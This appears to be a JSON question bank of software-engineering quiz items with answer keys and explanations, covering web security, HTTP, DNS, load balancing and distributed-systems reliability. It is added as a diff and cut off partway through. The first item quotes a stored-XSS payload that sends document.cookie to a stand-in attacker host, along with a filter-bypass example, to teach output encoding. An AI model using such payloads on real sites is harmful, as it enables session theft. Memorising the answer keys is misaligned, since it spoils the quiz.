@@ -1,0 +1,1493 @@
+{
+  "kind": "swe",
+  "questions": [
+    {
+      "id": "bank-swe-01",
+      "promptMd": "A forum shows user comments on its pages. An attacker posts `<script>fetch('https://evil.example/?c=' + document.cookie)</script>`. What's the main defence against this **stored XSS**?",
+      "choices": [
+        "Reject comments that contain the word \"script\"",
+        "Escape user content for the context it's inserted into (HTML-encode `<`, `>`, `&`, quotes), ideally via a templating engine that does it automatically",
+        "Serve the page over HTTPS",
+        "Store comments encrypted in the database"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "When the comment is rendered as text (`&lt;script&gt;…`), the browser displays it instead of running it. Auto-escaping templates make that the default.",
+      "choiceNotesMd": [
+        "Blocklists are easy to bypass: `<img src=x onerror=…>`, odd casing, encodings…",
+        "Correct: output encoding for the right context (HTML body, attribute, URL, JavaScript) stops the browser from treating data as code.",
+        "HTTPS protects the connection; the script arrives over it just fine.",
+        "It's decrypted before it's displayed, so it still runs."
+      ],
+      "tags": [
+        "security",
+        "web"
+      ],
+      "topicMd": "**Cross-site scripting (XSS).** XSS happens when untrusted data ends up in a page as executable code. *Stored* XSS saves the payload (a comment, a profile name); *reflected* XSS bounces it off a URL parameter; *DOM-based* XSS happens entirely in client-side JavaScript (`element.innerHTML = location.hash`).\n\nDefences, layered:\n\n- **Contextual output encoding**: frameworks like React, Jinja and Thymeleaf escape by default. Be suspicious of escape hatches such as `dangerouslySetInnerHTML`, `|safe` and `v-html`.\n- **Sanitize** when you genuinely need user-supplied HTML (DOMPurify), using an allowlist of tags.\n- **Content-Security-Policy**: forbid inline scripts and limit script sources, so an injection that slips through can't run.\n- **HttpOnly cookies**, so a successful script can't read the session cookie.",
+      "keyTerms": [
+        {
+          "term": "XSS",
+          "def": "Injecting script into pages other users view."
+        },
+        {
+          "term": "Output encoding",
+          "def": "Converting special characters so data is shown, not executed."
+        },
+        {
+          "term": "Content-Security-Policy",
+          "def": "Header restricting what scripts and resources a page may load."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-02",
+      "promptMd": "A banking site uses session cookies. A malicious page contains a hidden form that POSTs to `https://bank.example/transfer`. What stops this **cross-site request forgery**?",
+      "choices": [
+        "Checking that the request uses HTTPS",
+        "`SameSite=Lax` (or `Strict`) session cookies, plus an anti-CSRF token that the malicious page can't read",
+        "Requiring the user to be logged in",
+        "CORS headers on the bank's API"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "The attack works because the browser automatically attaches the bank's cookies. SameSite stops cookies being sent on cross-site POSTs, and a per-session token proves the form came from the bank's own pages.",
+      "choiceNotesMd": [
+        "The forged request is sent over HTTPS too.",
+        "Correct: SameSite cookies plus a CSRF token (or checking the Origin header).",
+        "The attack *relies* on the victim being logged in; their cookie rides along.",
+        "CORS controls reading responses. A form POST is sent without asking CORS, and the damage is done when it arrives."
+      ],
+      "tags": [
+        "security",
+        "web"
+      ],
+      "topicMd": "**CSRF.** The browser sends cookies with any request to a site, even one started by another site's form or image tag. If a state-changing endpoint only checks the session cookie, any page you visit can act as you.\n\nDefences:\n\n- **SameSite cookies**: `Lax` (the default in modern browsers) withholds cookies on cross-site subrequests and POSTs; `Strict` withholds them on all cross-site requests.\n- **Anti-CSRF tokens**: a random value embedded in your forms and checked on submit. Other sites can't read your pages, so they can't learn it.\n- **Check `Origin` / `Referer`** on state-changing requests.\n- Never change state with GET.\n\nAPIs that authenticate with a header token (`Authorization: Bearer …`) instead of cookies aren't vulnerable to classic CSRF, because browsers don't attach that header automatically.",
+      "keyTerms": [
+        {
+          "term": "CSRF",
+          "def": "Tricking a logged-in browser into sending an unwanted request."
+        },
+        {
+          "term": "SameSite",
+          "def": "Cookie attribute that limits sending cookies on cross-site requests."
+        },
+        {
+          "term": "Anti-CSRF token",
+          "def": "Secret per-session value that forms must echo back."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-03",
+      "promptMd": "What does the `HttpOnly` flag on a cookie do?",
+      "choices": [
+        "The cookie is only sent over HTTP, never HTTPS",
+        "JavaScript on the page can't read it through `document.cookie`",
+        "The cookie expires when the browser closes",
+        "The cookie is only sent to the exact path that set it"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "HttpOnly cookies are still sent with requests, but scripts can't read them, so an XSS bug can't simply steal the session id.",
+      "choiceNotesMd": [
+        "That's the opposite of `Secure`, which restricts a cookie to HTTPS.",
+        "Correct: hidden from scripts, still sent with requests.",
+        "That's a session cookie: one with no `Expires` or `Max-Age`.",
+        "That's the `Path` attribute."
+      ],
+      "tags": [
+        "security",
+        "web"
+      ],
+      "topicMd": "**Cookie attributes worth knowing.**\n\n- `HttpOnly`: not readable from JavaScript. Use it for session cookies.\n- `Secure`: only sent over HTTPS.\n- `SameSite=Lax|Strict|None`: controls cross-site sending (CSRF protection). `None` requires `Secure`.\n- `Domain` / `Path`: which hosts and paths receive it. Omitting `Domain` keeps it on the exact host.\n- `Expires` / `Max-Age`: persistence; without them the cookie lasts for the browser session.\n- The `__Host-` prefix forces `Secure`, `Path=/` and no `Domain`, which stops subdomains from overwriting it.\n\nA solid session cookie: `Set-Cookie: __Host-session=…; Secure; HttpOnly; SameSite=Lax; Path=/`.\n\nHttpOnly limits the damage of XSS, but doesn't prevent it: injected script can still make requests *as* the user while the page is open.",
+      "keyTerms": [
+        {
+          "term": "HttpOnly",
+          "def": "Cookie hidden from JavaScript."
+        },
+        {
+          "term": "Secure",
+          "def": "Cookie only sent over HTTPS."
+        },
+        {
+          "term": "Session cookie",
+          "def": "Cookie without an expiry, discarded when the browser closes."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-04",
+      "promptMd": "In the OAuth 2.0 authorization-code flow, what does **PKCE** protect against?",
+      "choices": [
+        "Phishing pages that imitate the login screen",
+        "An attacker who intercepts the authorization code and tries to exchange it for tokens",
+        "Expired refresh tokens",
+        "Brute-force guessing of user passwords"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "The app sends a hash of a random secret (the code challenge) when starting the login, and the secret itself (the verifier) when redeeming the code. A stolen code is useless without the verifier.",
+      "choiceNotesMd": [
+        "PKCE doesn't help users spot fake login pages.",
+        "Correct: it binds the authorization code to the app instance that started the flow.",
+        "Refresh token expiry and rotation are separate mechanisms.",
+        "Password guessing is the identity provider's problem (rate limits, MFA)."
+      ],
+      "tags": [
+        "security",
+        "auth"
+      ],
+      "topicMd": "**OAuth 2.0 and PKCE.** OAuth lets a user grant an app limited access without sharing their password. The common flow:\n\n1. The app redirects the user to the provider (Google, GitHub…) with its client id, the scopes and a redirect URI.\n2. The user signs in and consents; the provider redirects back with a short-lived **authorization code**.\n3. The app exchanges the code for an access token (and maybe a refresh token).\n\nMobile and single-page apps can't keep a client secret, so a code intercepted on its way back (by a malicious app registered for the same URL scheme, or leaked through logs) could be redeemed by someone else. **PKCE** (Proof Key for Code Exchange) fixes this: a random `code_verifier` stays in the app, only its SHA-256 hash travels in step 1, and step 3 must present the verifier. It's now recommended for every client.\n\nAlso use `state` (or the nonce in OpenID Connect) against forged callbacks. OpenID Connect adds an ID token, so OAuth can be used for *login*, not just API access.",
+      "keyTerms": [
+        {
+          "term": "Authorization code",
+          "def": "Short-lived code exchanged for tokens."
+        },
+        {
+          "term": "PKCE",
+          "def": "Proof Key for Code Exchange: binds the code to the client that asked for it."
+        },
+        {
+          "term": "Scope",
+          "def": "The specific permissions an access token grants."
+        },
+        {
+          "term": "OpenID Connect",
+          "def": "Identity layer on top of OAuth 2.0."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-05",
+      "promptMd": "A service only needs to **read** objects from one storage bucket. What's the best permission setup for its credentials?",
+      "choices": [
+        "Admin access, so it never hits a permission error",
+        "Read-only access to that one bucket",
+        "Read and write access to all buckets in the account",
+        "The same credentials every other service uses, to keep things simple"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Least privilege: grant exactly what the job needs. If the credentials leak or the service is compromised, the damage is limited to reading one bucket.",
+      "choiceNotesMd": [
+        "A leak of admin credentials compromises the whole account.",
+        "Correct: the narrowest permissions that still work.",
+        "Write access and other buckets aren't needed, so they're pure risk.",
+        "Shared credentials make it impossible to tell who did what, or to revoke one service without breaking the others."
+      ],
+      "tags": [
+        "security"
+      ],
+      "topicMd": "**Principle of least privilege.** Every identity (person, service, CI job) gets the minimum permissions it needs, for the shortest time it needs them.\n\nIn practice:\n\n- One identity per service, with narrowly scoped roles (specific actions on specific resources).\n- Short-lived credentials (cloud instance roles, OIDC tokens in CI) instead of long-lived keys.\n- Separate environments (dev, staging, production) with separate permissions.\n- Review and remove unused permissions; cloud providers can report which ones are actually used.\n\n---\n\nThe same idea applies everywhere: database users that can only `SELECT` from the tables they need, containers that don't run as root, browser extensions with narrow permissions, and GitHub Actions tokens with `permissions:` set per job. Least privilege doesn't prevent breaches, but it limits the **blast radius** when one happens.",
+      "keyTerms": [
+        {
+          "term": "Least privilege",
+          "def": "Grant only the access a task requires."
+        },
+        {
+          "term": "Blast radius",
+          "def": "How much damage one compromised component can cause."
+        },
+        {
+          "term": "Short-lived credentials",
+          "def": "Tokens that expire quickly, limiting the value of a leak."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-06",
+      "promptMd": "You accidentally pushed a commit containing a live API key to a public GitHub repository. What should you do **first**?",
+      "choices": [
+        "Delete the file in a new commit",
+        "Revoke (rotate) the key at the provider, then clean up the repository",
+        "Rewrite history with `git push --force` to remove the commit",
+        "Make the repository private"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Bots scan public commits for secrets within minutes, so assume the key is already compromised. Only revoking it makes the leaked copy useless.",
+      "choiceNotesMd": [
+        "The key is still in the history, and in any clones and caches already made.",
+        "Correct: revoke first, then rotate, check the provider's logs for misuse, and clean up.",
+        "Rewriting history helps tidy up, but forks, clones and caches may already have it.",
+        "It was public for a while, and existing clones keep it."
+      ],
+      "tags": [
+        "security",
+        "git"
+      ],
+      "topicMd": "**Leaked secrets.** Treat any secret that reached a shared repository, a log or a chat as compromised.\n\n1. **Revoke or rotate** it at the provider immediately.\n2. **Check for misuse**: the provider's audit logs, billing, unusual activity.\n3. **Clean up**: remove it from the code, and optionally from history (`git filter-repo`), knowing copies may survive elsewhere.\n4. **Prevent a repeat**: load secrets from environment variables or a secrets manager; add `.env` to `.gitignore`; turn on secret scanning and push protection; use pre-commit hooks such as gitleaks.\n\n---\n\nPrefer credentials that are short-lived and narrowly scoped, so a leak is worth little. Many providers partner with GitHub to revoke leaked tokens automatically, but don't rely on that.",
+      "keyTerms": [
+        {
+          "term": "Secret rotation",
+          "def": "Replacing a credential with a new one and invalidating the old."
+        },
+        {
+          "term": "Secret scanning",
+          "def": "Automated search for credentials in code and commits."
+        },
+        {
+          "term": "Secrets manager",
+          "def": "A service that stores and hands out credentials securely."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-07",
+      "promptMd": "Which of these is **encoding**, not encryption or hashing?",
+      "choices": [
+        "AES-256-GCM",
+        "SHA-256",
+        "Base64",
+        "bcrypt"
+      ],
+      "answerIndex": 2,
+      "explanationMd": "Base64 turns bytes into printable text and back again. Anyone can decode it; there's no key and nothing secret about it.",
+      "choiceNotesMd": [
+        "AES-GCM is encryption: reversible only with the key.",
+        "SHA-256 is a hash: one-way and fixed-length.",
+        "Correct: encoding is a reversible format change with no secret.",
+        "bcrypt is a deliberately slow password hash."
+      ],
+      "tags": [
+        "security"
+      ],
+      "topicMd": "**Encoding vs. encryption vs. hashing.**\n\n- **Encoding** (Base64, URL encoding, UTF-8, hex): changes the representation so data survives a channel. Reversible by anyone; provides **no** security.\n- **Encryption** (AES, ChaCha20, RSA): reversible only with a key. Provides confidentiality; modern AEAD modes (AES-GCM) also detect tampering.\n- **Hashing** (SHA-256, BLAKE3): one-way, fixed-size fingerprint. Good for integrity checks and deduplication. Passwords need slow, salted hashes (Argon2, bcrypt).\n- **MACs and signatures** (HMAC, Ed25519): prove who produced data and that it's unchanged.\n\nA classic mistake is \"securing\" credentials or tokens by Base64-encoding them, as in HTTP Basic auth, which is only safe over TLS.",
+      "keyTerms": [
+        {
+          "term": "Encoding",
+          "def": "Reversible change of representation, with no key."
+        },
+        {
+          "term": "Encryption",
+          "def": "Reversible with a key; hides content."
+        },
+        {
+          "term": "Hash",
+          "def": "One-way fixed-size fingerprint of data."
+        },
+        {
+          "term": "HMAC",
+          "def": "Keyed hash proving integrity and origin."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-08",
+      "promptMd": "What's the main performance win of **HTTP/2** over HTTP/1.1 for a page that loads many small files?",
+      "choices": [
+        "It compresses images better",
+        "Many requests and responses are multiplexed over one connection, so slow responses don't block the others",
+        "It removes the need for TLS",
+        "It caches files in the browser automatically"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "HTTP/1.1 handles one request at a time per connection, so browsers open about 6 connections per host and requests queue behind each other. HTTP/2 interleaves many streams on one connection.",
+      "choiceNotesMd": [
+        "Image formats and compression are separate from the protocol version.",
+        "Correct: multiplexing (plus header compression with HPACK).",
+        "Browsers only support HTTP/2 over TLS in practice.",
+        "Caching is still controlled by Cache-Control headers."
+      ],
+      "tags": [
+        "http",
+        "networking"
+      ],
+      "topicMd": "**HTTP/1.1 → HTTP/2 → HTTP/3.**\n\n- **HTTP/1.1**: one outstanding request per connection, so browsers open several connections and requests queue (head-of-line blocking). Hacks like file bundling and domain sharding were invented to cope.\n- **HTTP/2**: binary framing, many concurrent **streams** on one TCP connection, compressed headers (HPACK). Bundling matters much less.\n- **HTTP/3**: runs over QUIC on UDP. A lost packet in TCP stalls *every* HTTP/2 stream (TCP-level head-of-line blocking); QUIC only stalls the affected stream. It also combines the transport and TLS handshakes.\n\n---\n\nHTTP/2 server push turned out to be rarely useful and has been removed from browsers; `103 Early Hints` and preload links replaced it.",
+      "keyTerms": [
+        {
+          "term": "Multiplexing",
+          "def": "Interleaving many streams over one connection."
+        },
+        {
+          "term": "Head-of-line blocking",
+          "def": "One slow item holding up everything queued behind it."
+        },
+        {
+          "term": "QUIC",
+          "def": "UDP-based transport used by HTTP/3."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-09",
+      "promptMd": "A chat app needs the server to push new messages to the browser instantly. Which fits best?",
+      "choices": [
+        "The browser polls `GET /messages` once a minute",
+        "A WebSocket (or Server-Sent Events) connection that stays open",
+        "Email notifications",
+        "A long `Cache-Control: max-age`"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "A persistent connection lets the server send messages the moment they arrive, without the delay and wasted requests of polling.",
+      "choiceNotesMd": [
+        "Up to a minute's delay, and most polls come back empty.",
+        "Correct: WebSockets for two-way traffic, SSE for server-to-client streams.",
+        "Not instant, and outside the app.",
+        "Caching makes updates slower, not faster."
+      ],
+      "tags": [
+        "web",
+        "networking"
+      ],
+      "topicMd": "**Getting updates to the browser.**\n\n- **Short polling**: ask every N seconds. Simple, but either slow or wasteful.\n- **Long polling**: the server holds each request open until there's news, then the client immediately asks again. Works everywhere.\n- **Server-Sent Events (SSE)**: one HTTP response that streams events from server to client, with automatic reconnection. Great for feeds and notifications.\n- **WebSockets**: a full-duplex, message-based connection upgraded from HTTP. Best for chat, games and collaboration.\n\n---\n\nOperational notes: persistent connections need load balancers and proxies that support long-lived connections, a plan for reconnecting and catching up after drops (send the last-seen message id), and a pub/sub layer (Redis, NATS…) so any server can deliver to any connected user.",
+      "keyTerms": [
+        {
+          "term": "WebSocket",
+          "def": "Persistent, two-way connection between browser and server."
+        },
+        {
+          "term": "Server-Sent Events",
+          "def": "One-way event stream from server to browser over HTTP."
+        },
+        {
+          "term": "Long polling",
+          "def": "Holding a request open until there's new data."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-10",
+      "promptMd": "You're moving a website to a new server and will update its DNS record. The record currently has a **TTL of 24 hours**. What should you do a day or more beforehand?",
+      "choices": [
+        "Nothing; DNS changes apply instantly everywhere",
+        "Lower the TTL (to a few minutes) so caches pick up the change quickly on migration day",
+        "Raise the TTL so the old address stays cached longer",
+        "Delete the record and recreate it on the day"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Resolvers cache the record for its TTL. If it's 24 hours, some users keep hitting the old server for up to a day after you switch.",
+      "choiceNotesMd": [
+        "Resolvers may serve the cached answer until its TTL runs out.",
+        "Correct: lower it in advance (wait out the old TTL), switch, then raise it again later.",
+        "That makes the old address stick around even longer.",
+        "Deleting it causes failed lookups, and those can be cached too (negative caching)."
+      ],
+      "tags": [
+        "networking",
+        "dns"
+      ],
+      "topicMd": "**DNS TTLs.** Every DNS answer carries a time-to-live, and resolvers (ISPs, company networks, browsers, operating systems) may reuse it until it expires. Changing the record doesn't reach people whose resolvers already hold a cached copy.\n\nMigration recipe:\n\n1. At least one old-TTL period before, lower the TTL (to 60–300 seconds).\n2. Switch the record, and keep the old server running until traffic drains.\n3. Raise the TTL again once things are stable (long TTLs mean fewer lookups and more resilience).\n\n---\n\nRelated: failed lookups are cached too (negative caching, governed by the zone's SOA record), some clients ignore TTLs, and long-lived connections stay on the old IP until they reconnect. For fast failover, use load balancers or anycast rather than DNS changes.",
+      "keyTerms": [
+        {
+          "term": "TTL",
+          "def": "How long a DNS answer may be cached."
+        },
+        {
+          "term": "Resolver",
+          "def": "The server that looks up and caches DNS answers for clients."
+        },
+        {
+          "term": "Negative caching",
+          "def": "Caching the fact that a name doesn't exist."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-11",
+      "promptMd": "What can a **layer 7** (HTTP) load balancer do that a **layer 4** (TCP) one can't?",
+      "choices": [
+        "Spread connections across several servers",
+        "Route requests by URL path, header or cookie, e.g. `/api` to one pool and `/static` to another",
+        "Work with TCP",
+        "Detect servers that stop responding"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "A layer 7 balancer terminates the HTTP connection and reads each request, so it can make decisions based on its content. A layer 4 balancer only sees IP addresses and ports.",
+      "choiceNotesMd": [
+        "Both can do that.",
+        "Correct: content-based routing needs to understand HTTP.",
+        "Layer 4 is TCP/UDP: that's exactly what it works with.",
+        "Both can run health checks (layer 4 ones are TCP-level)."
+      ],
+      "tags": [
+        "system design",
+        "networking"
+      ],
+      "topicMd": "**Layer 4 vs. layer 7 load balancing.**\n\n- **L4** (transport): forwards TCP or UDP connections by IP and port. Fast and protocol-agnostic (databases, game servers, any TCP service), but it can't look inside requests; one connection sticks to one backend.\n- **L7** (application): terminates HTTP(S) and makes per-request decisions: path- and host-based routing, header rewriting, cookie-based stickiness, retries, rate limiting, authentication, compression, and canary splits by percentage.\n\n---\n\nMany setups use both: a cloud L4 balancer (or anycast) in front of a fleet of L7 proxies such as Envoy, NGINX or HAProxy. Service meshes put an L7 proxy next to every service. Typical algorithms: round-robin, least connections, and consistent hashing for cache affinity.",
+      "keyTerms": [
+        {
+          "term": "Layer 4",
+          "def": "Transport layer: TCP/UDP connections, IPs and ports."
+        },
+        {
+          "term": "Layer 7",
+          "def": "Application layer: HTTP requests and their content."
+        },
+        {
+          "term": "TLS termination",
+          "def": "Decrypting HTTPS at the proxy before forwarding."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-12",
+      "promptMd": "A client keeps getting `503 Service Unavailable` from a struggling server. What's the best retry strategy?",
+      "choices": [
+        "Retry immediately in a tight loop until it works",
+        "Retry with exponential backoff plus random jitter, a cap on attempts, and respect any `Retry-After` header",
+        "Never retry anything",
+        "Retry from many threads in parallel to get through faster"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Backing off gives the server room to recover, and jitter stops every client from retrying at the same instants.",
+      "choiceNotesMd": [
+        "Thousands of clients doing this turn a slowdown into an outage (a retry storm).",
+        "Correct: exponential backoff, jitter, a retry budget, and honouring Retry-After.",
+        "Many failures are temporary; one well-spaced retry often succeeds.",
+        "That multiplies the load on a server that's already overloaded."
+      ],
+      "tags": [
+        "distributed systems",
+        "reliability"
+      ],
+      "topicMd": "**Retrying well.**\n\n- Retry only what's safe: idempotent requests, or ones that carry an idempotency key, and only on transient errors (timeouts, 429, 502/503/504), never on 400-level mistakes.\n- **Exponential backoff**: wait about base × 2^attempt (100 ms, 200 ms, 400 ms…), capped.\n- **Jitter**: randomise each wait (e.g. uniformly between 0 and the backoff) so clients don't retry in lockstep.\n- **Limits**: a maximum number of attempts and an overall deadline, plus a retry budget (say, retries ≤ 10% of requests).\n- Honour `Retry-After` on 429 and 503 responses.\n\n---\n\nIn deep call chains, retries multiply: 3 attempts at each of 4 layers is up to 81 calls to the bottom service. Retry at one layer only, and combine retries with timeouts and circuit breakers.",
+      "keyTerms": [
+        {
+          "term": "Exponential backoff",
+          "def": "Doubling the wait after each failed attempt."
+        },
+        {
+          "term": "Jitter",
+          "def": "Randomness added to waits to spread retries out."
+        },
+        {
+          "term": "Retry storm",
+          "def": "Synchronised retries overwhelming a recovering service."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-13",
+      "promptMd": "Why should every outgoing network call (HTTP, database, cache) have a **timeout**?",
+      "choices": [
+        "Timeouts make requests faster",
+        "Without one, a hung dependency can hold threads or connections forever, until the caller runs out of them and fails too",
+        "They're only needed for calls over the public internet",
+        "Libraries already default to short timeouts"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "A slow or dead dependency doesn't always fail quickly. Each waiting call ties up a thread, connection or memory, so without timeouts one stuck service can exhaust its callers' resources.",
+      "choiceNotesMd": [
+        "They don't speed up successful calls; they bound how long a failure can take.",
+        "Correct: timeouts stop slowness from spreading into a cascading failure.",
+        "Internal networks hang too: overloaded services, dropped packets, long GC pauses.",
+        "Many defaults are infinite or very long (some HTTP clients wait forever by default)."
+      ],
+      "tags": [
+        "distributed systems",
+        "reliability"
+      ],
+      "topicMd": "**Timeouts.** A request with no timeout can wait forever: the remote process is stuck, a packet was silently dropped, or a firewall swallowed the connection. Meanwhile it holds a thread or connection-pool slot. Enough of them, and the caller can't serve anyone: a **cascading failure**.\n\nGuidelines:\n\n- Set both a connect timeout (short) and a read or overall timeout.\n- Base values on the dependency's real latency (say, a bit above its p99.9), not a round number like 30 s.\n- Pass a **deadline** down the call chain, so downstream work stops when the user has already given up (gRPC propagates deadlines automatically).\n- Pair timeouts with limited retries and circuit breakers.\n\n---\n\nAlso bound the work itself: maximum queue sizes, request size limits and connection-pool limits, so overload makes the system shed load instead of falling over.",
+      "keyTerms": [
+        {
+          "term": "Timeout",
+          "def": "Maximum time to wait before giving up on an operation."
+        },
+        {
+          "term": "Cascading failure",
+          "def": "One component's failure exhausting and breaking others."
+        },
+        {
+          "term": "Deadline propagation",
+          "def": "Passing the remaining time budget to downstream calls."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-14",
+      "promptMd": "A dependency is failing, and every call to it waits 5 seconds and then times out. What does a **circuit breaker** do?",
+      "choices": [
+        "It retries each call 5 more times",
+        "After enough failures it \"opens\" and fails calls immediately for a while, then lets a few trial calls through to check whether the dependency has recovered",
+        "It restarts the failing service",
+        "It caches every response forever"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Failing fast stops callers from wasting threads and time on a dependency that's down, and gives it room to recover. Half-open trial calls detect recovery.",
+      "choiceNotesMd": [
+        "More retries pile even more load onto the failing dependency.",
+        "Correct: closed → open (fail fast) → half-open (trial calls) → closed again.",
+        "Restarting is the orchestrator's job (health checks), not the caller's.",
+        "Caching can be a fallback, but that's a separate decision."
+      ],
+      "tags": [
+        "distributed systems",
+        "reliability"
+      ],
+      "topicMd": "**Circuit breakers.** Like the electrical kind, they stop the flow when something is wrong:\n\n- **Closed**: calls go through normally, and failures are counted.\n- **Open**: after the failure rate passes a threshold, calls fail immediately (or use a fallback) for a cool-down period.\n- **Half-open**: a few trial calls go through; success closes the circuit, failure re-opens it.\n\nBenefits: callers stay responsive, threads aren't tied up waiting on a dead dependency, and the struggling service gets breathing room.\n\n---\n\nFallbacks when open: cached or default data, a degraded feature (\"recommendations unavailable\"), or a clear error. Libraries: Resilience4j (Java), Polly (.NET), pybreaker (Python), and service meshes like Envoy and Istio (outlier detection). Combine with timeouts and **bulkheads**: separate resource pools per dependency, so one slow dependency can't use up every thread.",
+      "keyTerms": [
+        {
+          "term": "Circuit breaker",
+          "def": "Stops calling a failing dependency for a while."
+        },
+        {
+          "term": "Half-open",
+          "def": "Trial state that tests whether the dependency has recovered."
+        },
+        {
+          "term": "Bulkhead",
+          "def": "Isolated resource pools so one failure can't drain them all."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-15",
+      "promptMd": "A replicated key-value store keeps **N = 3** copies of each key. Writes wait for **W = 2** replicas to acknowledge, and reads ask **R = 2** replicas and take the newest value. Why does a read always see the latest acknowledged write?",
+      "choices": [
+        "Because 3 is an odd number",
+        "Because R + W > N: any 2 replicas you read overlap with the 2 that acknowledged the write",
+        "Because reads always go to the leader",
+        "It doesn't: the read may return stale data"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "With 3 replicas, any 2 read and any 2 written must share at least one replica, and that replica has the latest acknowledged write.",
+      "choiceNotesMd": [
+        "Odd counts help majority votes, but the guarantee comes from the overlap.",
+        "Correct: R + W > N forces the read set and the write set to intersect.",
+        "In leaderless (Dynamo-style) stores, any replica can serve reads and writes.",
+        "With R + W ≤ N (say R = 1, W = 1) it could; here the overlap prevents it (barring edge cases like sloppy quorums)."
+      ],
+      "tags": [
+        "distributed systems",
+        "replication"
+      ],
+      "topicMd": "**Quorums.** With N replicas, a write succeeds once W replicas acknowledge it, and a read collects R responses. If **R + W > N**, every read quorum overlaps every write quorum, so at least one reply carries the latest acknowledged write (pick it by version or timestamp).\n\nTuning:\n\n- N = 3, W = 2, R = 2: survives one replica down for both reads and writes.\n- W = 3, R = 1: fast reads, but writes fail if any replica is down.\n- W = 1, R = 1: fastest, with no overlap guarantee (eventual consistency).\n\n---\n\nCaveats in real systems (Cassandra, DynamoDB-style stores): \"sloppy\" quorums during partitions, concurrent writes that need conflict resolution (last-write-wins or vector clocks), and read repair or anti-entropy to bring stale replicas up to date. Majority quorums also underpin consensus protocols like Raft and Paxos.",
+      "keyTerms": [
+        {
+          "term": "Quorum",
+          "def": "The minimum number of replicas that must take part in an operation."
+        },
+        {
+          "term": "R + W > N",
+          "def": "Condition for every read quorum to overlap every write quorum."
+        },
+        {
+          "term": "Read repair",
+          "def": "Fixing stale replicas noticed during reads."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-16",
+      "promptMd": "A service saves an order to its database and then publishes an `OrderCreated` event to a message broker. Sometimes the process crashes between the two steps. What's the standard fix?",
+      "choices": [
+        "Publish the event first, then save the order",
+        "The transactional outbox: write the event into an `outbox` table in the same database transaction as the order, and have a separate relay publish it",
+        "Wrap both steps in a try/except",
+        "Use a faster message broker"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "One local transaction makes \"order saved\" and \"event recorded\" atomic. The relay then publishes from the outbox and retries until the broker confirms.",
+      "choiceNotesMd": [
+        "Then a crash leaves an event about an order that was never saved.",
+        "Correct: atomicity within one database, then at-least-once delivery.",
+        "An exception handler can't run if the process is killed or the machine dies.",
+        "Speed doesn't matter; the problem is that two separate systems can't commit atomically."
+      ],
+      "tags": [
+        "distributed systems",
+        "databases"
+      ],
+      "topicMd": "**The dual-write problem.** Writing to two systems (a database and a broker, or a database and a cache) can't be atomic: a crash between the writes leaves them inconsistent, whichever order you choose.\n\n**Transactional outbox:**\n\n1. In the same transaction as the business change, insert the event into an `outbox` table.\n2. A relay process (polling, or change data capture such as Debezium reading the database log) publishes outbox rows to the broker and marks them sent.\n3. Delivery is **at-least-once**, so consumers must be idempotent (deduplicate by event id).\n\n---\n\nRelated patterns: the **inbox** on the consumer side (record processed message ids in the same transaction as the effect), and **sagas** for multi-service workflows, which are a series of local transactions with compensating actions instead of a distributed transaction.",
+      "keyTerms": [
+        {
+          "term": "Dual write",
+          "def": "Updating two systems without a shared transaction."
+        },
+        {
+          "term": "Transactional outbox",
+          "def": "Store events with the data change, then publish them separately."
+        },
+        {
+          "term": "Change data capture",
+          "def": "Streaming a database's committed changes from its log."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-17",
+      "promptMd": "What's the classic weakness of **two-phase commit** (2PC) across several databases?",
+      "choices": [
+        "It can't guarantee atomicity",
+        "If the coordinator crashes after participants have voted \"yes\", they're stuck holding locks until it comes back",
+        "It only works with two participants",
+        "It's slower than a single-database transaction, but otherwise has no drawbacks"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "A participant that voted yes has promised to commit if told to, so it can't decide on its own. If the coordinator disappears at that moment, it waits, still holding its locks: 2PC is a blocking protocol.",
+      "choiceNotesMd": [
+        "Atomicity is exactly what 2PC provides, at a cost.",
+        "Correct: the in-doubt window blocks participants on a coordinator failure.",
+        "\"Two-phase\" refers to the prepare and commit phases, not the number of participants.",
+        "Besides the latency, the blocking failure mode and the tight coupling are real drawbacks."
+      ],
+      "tags": [
+        "distributed systems",
+        "transactions"
+      ],
+      "topicMd": "**Two-phase commit.**\n\n1. **Prepare**: the coordinator asks every participant to get ready; each makes its changes durable, keeps its locks, and votes yes or no.\n2. **Commit**: if all voted yes, the coordinator tells everyone to commit; otherwise to abort.\n\nBetween voting yes and hearing the outcome, a participant is **in doubt**: it can't commit or abort on its own. A coordinator crash leaves it blocked with locks held, possibly stalling other transactions.\n\n---\n\nAlternatives and mitigations:\n\n- Make the coordinator highly available with consensus (Raft or Paxos), as Spanner does.\n- Avoid cross-service transactions: use **sagas** (local transactions plus compensating actions) and the outbox pattern, accepting eventual consistency.\n- Keep data that must change together in one database where possible.",
+      "keyTerms": [
+        {
+          "term": "Two-phase commit",
+          "def": "Prepare, then commit, across multiple participants."
+        },
+        {
+          "term": "In-doubt transaction",
+          "def": "Prepared, but waiting to hear the final decision."
+        },
+        {
+          "term": "Saga",
+          "def": "Sequence of local transactions with compensating steps."
+        }
+      ]
